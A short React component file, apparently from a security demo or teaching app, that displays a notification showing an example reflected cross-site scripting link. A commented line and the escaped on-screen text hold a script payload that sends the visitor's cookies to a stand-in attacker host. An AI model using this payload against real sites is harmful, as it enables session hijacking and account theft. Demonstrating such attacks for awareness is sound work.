// export const notificationMessage = "www.welp.com?search=<script>window.location='www.haxxed.com?cookie='+document.cookie</script>";
import { Paper, Typography } from '@mui/material'
import React from 'react'

const notification = () => {
  return (
    <Paper sx={{ p: 2, mb: 2, backgroundColor: 'blue',width: '40%'}}>
              <Typography variant="body1" color="white">
                www.welp.com?<br/>search=&lt;script&gt;window.location='www.haxxed.com?<br/>cookie='+document.cookie&lt;/script&gt;
              </Typography>
            </Paper>
  )
}

export default notification
